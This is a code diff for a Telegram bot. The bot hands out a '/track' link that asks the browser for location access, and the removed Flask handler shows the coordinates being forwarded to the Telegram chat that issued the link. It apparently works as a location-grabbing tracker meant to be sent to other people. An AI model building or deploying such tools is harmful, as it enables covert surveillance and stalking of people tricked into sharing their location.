@@ -1,28 +1,34 @@
 import os
-from flask import Flask, request, render_template
-import requests
+import telegram
+from telegram.ext import Updater, CommandHandler
 
-app = Flask(__name__)
-
-# Bot token will be stored securely as environment variable
+# Telegram bot token from environment variable
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 
-@app.route("/track")
-def track():
-    return render_template("index.html")
+# Tumhara Render link:
+RENDER_DOMAIN = "https://rudelegalinternet.onrender.com"
 
-@app.route("/send_location", methods=["POST"])
-def send_location():
-    data = request.json
-    lat = data["lat"]
-    lon = data["lon"]
-    user_id = data["id"]
+# Start command handler
+def start(update, context):
+    user_id = update.message.chat_id
+    track_link = f"{RENDER_DOMAIN}/track?id={user_id}"
+    
+    message = (
+        "🔍 Hello! Click the link below to share your location:\n\n"
+        f"{track_link}\n\n"
+        "📍 Allow location access in browser when prompted."
+    )
+    
+    context.bot.send_message(chat_id=user_id, text=message)
 
-    message = f"📍 Location Received:\nLatitude: {lat}\nLongitude: {lon}"
+def main():
+    updater = Updater(token=BOT_TOKEN, use_context=True)
+    dp = updater.dispatcher
 
-    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
-        "chat_id": user_id,
-        "text": message
-    })
+    dp.add_handler(CommandHandler("start", start))
 
-    return "ok", 200
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == "__main__":
+    main()
